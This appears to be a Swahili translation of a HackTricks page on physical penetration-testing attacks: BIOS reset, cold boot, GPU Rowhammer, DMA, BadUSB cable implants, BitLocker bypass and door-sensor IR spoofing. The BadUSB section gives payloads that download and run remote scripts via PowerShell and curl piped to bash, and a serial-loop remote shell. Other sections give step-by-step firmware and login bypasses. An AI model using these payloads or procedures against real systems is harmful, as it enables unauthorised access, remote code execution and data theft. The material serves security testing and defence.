# Mashambulizi ya Kimaumbile

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

**Kuweka upya BIOS** kunaweza kufanywa kwa njia kadhaa. Motherboard nyingi zina **battery** ambayo, ikiondolewa kwa takriban **dakika 30**, itaweka upya mipangilio ya BIOS, ikiwemo nenosiri. Vinginevyo, **jumper kwenye motherboard** inaweza kurekebishwa ili kuweka upya mipangilio hii kwa kuunganisha pins maalum.

Katika hali ambapo marekebisho ya hardware hayawezekani au hayafai, **software tools** hutoa suluhisho. Kuendesha mfumo kutoka kwenye **Live CD/USB** yenye distributions kama **Kali Linux** kunatoa ufikiaji wa tools kama **_killCmos_** na **_CmosPWD_**, ambazo zinaweza kusaidia katika urejeshaji wa nenosiri la BIOS.

Katika hali ambapo nenosiri la BIOS halijulikani, kuliingiza kimakosa **mara tatu** kwa kawaida kutasababisha error code. Code hii inaweza kutumiwa kwenye websites kama [https://bios-pw.org](https://bios-pw.org) ili uwezekano wa kupata nenosiri linaloweza kutumika.

### Usalama wa UEFI

Kwa mifumo ya kisasa inayotumia **UEFI** badala ya BIOS ya kawaida, tool **chipsec** inaweza kutumika kuchanganua na kurekebisha mipangilio ya UEFI, ikiwemo kuzima **Secure Boot**. Hili linaweza kufanywa kwa command ifuatayo:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Uchambuzi wa RAM na Cold Boot Attacks

RAM huhifadhi data kwa muda mfupi baada ya umeme kukatwa, kwa kawaida kwa **dakika 1 hadi 2**. Uendelevu huu unaweza kuongezwa hadi **dakika 10** kwa kutumia vitu vya baridi, kama vile nitrogeni kimiminika. Katika kipindi hiki kilichoongezwa, **memory dump** inaweza kuundwa kwa kutumia tools kama **dd.exe** na **volatility** kwa ajili ya uchambuzi.

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yanapolenga **GPU virtual-memory metadata** badala ya buffers za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kwamba mshambuliaji anayeendesha CUDA code bila privileged access anaweza kuunda hammering patterns maalum za GPU, kutumia **memory massaging** kuweka paging structures kwenye rows zilizo hatarini, na kisha kubadilisha bits kwenye **last-level page table** au **page directory** ya kati. Baada ya translation entry moja kuharibika, mshambuliaji anaweza kuanzisha **arbitrary GPU memory read/write** na kisha kuhamia kwenye compromise ya host.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Exploitation

1. **Profile hammerable rows** katika GDDR6 na uunde hammering patterns zinazotambua refresh / zisizo na uniformity ambazo hupita in-DRAM mitigations.
2. **Massage GPU allocations** ili driver iweke page-translation structures katika maeneo ya physical memory yanayoweza kuhammeriwa badala ya kuyaweka kwenye default protected pool. Kwa vitendo, hii inaweza kumaanisha kumaliza low-memory page-table region na kusambaza UVM mappings kubwa na sparse zenye strides zinazodhibitiwa.
3. **Flip translation metadata** kama **PFN** au bits zinazohusiana na aperture ndani ya page-table / page-directory entry ili virtual page inayodhibitiwa na mshambuliaji ielekezwe kwenye page-table pages, arbitrary GPU memory, au system mappings zinazoonekana na host.
4. Tumia tena forged mapping kuandika upya translation entries za ziada na kuendeleza mashambulizi hadi kupata **arbitrary GPU memory read/write** katika GPU contexts mbalimbali.

### Host Pivot na Mitigations

- **IOMMU ikiwa disabled**, forged system-aperture mappings zinaweza kufichua **host physical memory** yoyote kwa GPU, na kugeuza GPU primitive kuwa compromise kamili ya host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga last-level page-table entries, huku **GeForge** ikionyesha kwamba kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu bit flip moja inaweza kuelekeza upya translation subtree kubwa zaidi. Usichukulie paging layer moja pekee kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya arbitrary-host-memory inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha pivot ya hatua ya pili ambapo mshambuliaji huharibu CPU buffers zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha kuchochea memory-safety bugs za NVIDIA driver ili kupata kernel write primitive na **root shell** hata IOMMU ikiwa enabled.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya practical hardening kwenye workstation/server GPUs zinazoiunga mkono. Consumer GPUs zisizo na ECC zina defense surface dhaifu zaidi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia pekee: **GeForge** iliripoti **1,171** bit flips kwenye RTX 3060 na **202** kwenye RTX A6000, idadi iliyotosha kuunda host-privilege-escalation chain inayofanya kazi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

**INCEPTION** ni tool iliyoundwa kwa ajili ya **physical memory manipulation** kupitia DMA, na inaoana na interfaces kama **FireWire** na **Thunderbolt**. Inaruhusu bypass ya login procedures kwa kupatch memory ili ikubali password yoyote. Hata hivyo, haifanyi kazi dhidi ya mifumo ya **Windows 10**.

---

## Live CD/USB kwa System Access

Kubadilisha system binaries kama **_sethc.exe_** au **_Utilman.exe_** kwa copy ya **_cmd.exe_** kunaweza kutoa command prompt yenye system privileges. Tools kama **chntpw** zinaweza kutumika kuhariri **SAM** file ya Windows installation, na hivyo kuruhusu password changes.

**Kon-Boot** ni tool inayorahisisha kuingia kwenye Windows systems bila kujua password kwa kurekebisha Windows kernel au UEFI kwa muda. Maelezo zaidi yanapatikana kwenye [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Kushughulikia Windows Security Features

### Boot na Recovery Shortcuts

- **Supr**: Fikia BIOS settings.
- **F8**: Ingia kwenye Recovery mode.
- Kubonyeza **Shift** baada ya Windows banner kunaweza kupita autologon.

### BAD USB Devices

Devices kama **Rubber Ducky** na **Teensyduino** hutumika kama platforms za kuunda **bad USB** devices, zenye uwezo wa kutekeleza predefined payloads zinapounganishwa kwenye target computer.

### Volume Shadow Copy

Administrator privileges huruhusu kuunda copies za files nyeti, ikiwemo **SAM** file, kupitia PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implants zinazotumia ESP32-S3 kama **Evil Crow Cable Wind** hujificha ndani ya nyaya za USB-A→USB-C au USB-C↔USB-C, hujitambulisha kabisa kama USB keyboard, na hutoa C2 stack yake kupitia Wi-Fi. Operator anahitaji tu kuipa cable umeme kutoka kwa victim host, kuunda hotspot yenye jina `Evil Crow Cable Wind` na password `123456789`, kisha kuvinjari [http://cable-wind.local/](http://cable-wind.local/) (au DHCP address yake) ili kufikia embedded HTTP interface.<sup>[[8]](#references)</sup>
- Browser UI hutoa tabs za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payloads zilizohifadhiwa huwekwa tags kulingana na OS, keyboard layouts hubadilishwa on the fly, na VID/PID strings zinaweza kubadilishwa ili kuiga peripherals zinazojulikana.
- Kwa sababu C2 iko ndani ya cable, simu inaweza kuandaa payloads, kuanzisha execution, na kusimamia Wi-Fi credentials bila kugusa host OS—hali inayofaa kwa short dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules huunganisha payloads moja au zaidi ili zi-fire mara moja baada ya USB enumeration. Implant hufanya OS fingerprinting nyepesi na kuchagua script inayolingana.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa sababu execution hutokea bila usimamizi, kubadilisha charging cable pekee kunaweza kupata initial access ya “plug-and-pwn” chini ya logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Payload iliyohifadhiwa hufungua console na kupaste loop inayotekeleza chochote kinachofika kwenye USB serial device mpya. Windows variant ndogo ni:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikianzisha TCP client (Python script, Android APK, au desktop executable) kuelekea kwa operator. Byte zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyo hapo juu, na hivyo kutoa remote command execution hata kwenye hosts zilizotengwa na mtandao. Output ni finyu, kwa hivyo operators kwa kawaida huendesha blind commands (kuunda akaunti, staging ya tooling ya ziada, n.k.).

### HTTP OTA update surface

- Web stack hiyo hiyo kwa kawaida hufichua firmware updates zisizohitaji authentication. Evil Crow Cable Wind husikiliza kwenye `/update` na ku-flash binary yoyote inayopakiwa:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Waendeshaji wa field wanaweza kubadilisha features kwa hot-swap (kwa mfano, ku-flash firmware ya flash USB Army Knife) katikati ya engagement bila kufungua cable, hivyo kuruhusu implant kubadili kwenda kwenye capabilities mpya huku ikiwa bado imechomekwa kwenye host inayolengwa.

## Bypassing BitLocker Encryption

BitLocker encryption inaweza potential bypass kufanyika ikiwa **recovery password** itapatikana ndani ya memory dump file (**MEMORY.DMP**). Tools kama **Elcomsoft Forensic Disk Decryptor** au **Passware Kit Forensic** zinaweza kutumika kwa kusudi hili.

---

## Social Engineering for Recovery Key Addition

BitLocker recovery key mpya inaweza kuongezwa kupitia mbinu za social engineering, kwa kumshawishi mtumiaji atekeleze command inayoongeza recovery key mpya iliyoundwa kwa zeros, hivyo kurahisisha mchakato wa decryption.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Laptops nyingi za kisasa na desktops za small-form-factor zina **chassis-intrusion switch** inayofuatiliwa na Embedded Controller (EC) pamoja na BIOS/UEFI firmware. Ingawa kusudi kuu la switch ni kutoa alert kifaa kinapofunguliwa, vendors wakati mwingine hutekeleza **undocumented recovery shortcut** inayowashwa switch inapobadilishwa kwa pattern maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### How the Attack Works

1. Switch imeunganishwa kwenye **GPIO interrupt** kwenye EC.
2. Firmware inayotumika kwenye EC hufuatilia **timing na idadi ya presses**.
3. Pattern iliyowekwa moja kwa moja inapotambuliwa, EC huanzisha routine ya *mainboard-reset* inayofuta yaliyomo kwenye system NVRAM/CMOS.
4. Kwenye boot inayofuata, BIOS hupakia default values – **supervisor password, Secure Boot keys, na custom configuration yote hufutwa**.

> Mara Secure Boot inapozimwa na firmware password kuondolewa, attacker anaweza kuwasha tu external OS image yoyote na kupata unrestricted access kwenye internal drives.

### Real-World Example – Framework 13 Laptop

Recovery shortcut ya Framework 13 (11th/12th/13th-gen) ni:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Baada ya mzunguko wa kumi, EC huweka flag inayoelekeza BIOS kufuta NVRAM wakati wa reboot inayofuata. Utaratibu mzima huchukua ~40 s na huhitaji **bisibisi pekee**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa au simamisha-kisha-endeleza target ili EC iwe inafanya kazi.
2. Ondoa kifuniko cha chini ili kufikia intrusion/maintenance switch.
3. Rudia mpangilio wa toggle unaotegemea vendor (chunguza documentation, forums, au reverse-engineer firmware ya EC).
4. Unganisha tena na reboot – ulinzi wa firmware unapaswa kuwa umezimwa.
5. Boot live USB (kwa mfano Kali Linux) na ufanye post-exploitation ya kawaida (credential dumping, data exfiltration, kuingiza EFI binaries hasidi, n.k.).

### Utambuzi na Mitigation

* Andika matukio ya chassis-intrusion katika OS management console na uyalinganishe na BIOS resets zisizotarajiwa.
* Tumia **tamper-evident seals** kwenye screws/covers ili kugundua kufunguliwa.
* Hifadhi vifaa katika maeneo yanayodhibitiwa **kimwili**; chukulia kwamba physical access ni sawa na full compromise.
* Iwapo inapatikana, zima kipengele cha vendor cha “maintenance switch reset” au hitaji cryptographic authorisation ya ziada kwa NVRAM resets.

---

## Covert IR Injection Dhidi ya No-Touch Exit Sensors

### Sifa za Sensor
- Commodity “wave-to-exit” sensors huunganisha near-IR LED emitter na receiver module ya aina ya TV remote ambayo huripoti logic high tu baada ya kuona pulses nyingi (~4–10) za carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastic shroud huzuia emitter na receiver kutazamana moja kwa moja, hivyo controller hudhani kwamba carrier iliyothibitishwa ilitokana na reflection ya karibu na huendesha relay inayofungua door strike.
- Mara controller inapoamini kwamba target ipo, mara nyingi hubadilisha outbound modulation envelope, lakini receiver huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Attack Workflow
1. **Capture emission profile** – unganisha logic analyser kwenye controller pins ili kurekodi waveforms za kabla na baada ya detection zinazoendesha internal IR LED.
2. **Replay waveform ya “post-detection” pekee** – ondoa/puuza stock emitter na uendeshe external IR LED kwa kutumia pattern ambayo tayari imetriggeriwa tangu mwanzo. Kwa sababu receiver inajali tu pulse count/frequency, huchukulia carrier iliyospoofiwa kama reflection halisi na ku-assert relay line.
3. **Gate transmission** – tuma carrier katika bursts zilizotunzwa (kwa mfano, makumi ya milliseconds ikiwa imewashwa, na muda unaokaribiana ikiwa imezimwa) ili kutoa minimum pulse count bila kusaturate AGC ya receiver au interference handling logic. Continuous emission huifanya sensor ipoteze sensitivity haraka na kuzuia relay kufire.

### Long-Range Reflective Injection
- Kubadilisha bench LED na high-power IR diode, MOSFET driver, na focusing optics huwezesha triggering ya kuaminika kutoka umbali wa ~6 m.
- Mshambuliaji hahitaji line-of-sight hadi receiver aperture; kulenga beam kwenye interior walls, shelving, au door frames zinazoonekana kupitia kioo huruhusu reflected energy kuingia kwenye field of view ya ~30° na kuiga hand wave ya karibu.
- Kwa sababu receivers hutegemea reflections hafifu pekee, external beam yenye nguvu zaidi inaweza kuruka kwenye surfaces nyingi na bado ibaki juu ya detection threshold.

### Weaponised Attack Torch
- Kuweka driver ndani ya flashlight ya kibiashara huficha tool hadharani. Badilisha visible LED na high-power IR LED inayolingana na band ya receiver, ongeza ATtiny412 (au inayofanana) ili kuzalisha bursts za ≈30 kHz, na tumia MOSFET sink LED current.
- Telescopic zoom lens hukaza beam kwa range/precision, huku vibration motor iliyo chini ya MCU control ikitoa haptic confirmation kwamba modulation inafanya kazi bila kutoa visible light.
- Kupitia modulation patterns kadhaa zilizohifadhiwa (carrier frequencies na envelopes zinazotofautiana kidogo) huongeza compatibility katika sensor families zilizorebrandiwa, na kumruhusu operator kuscan reflective surfaces hadi relay isikike ikibofya na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
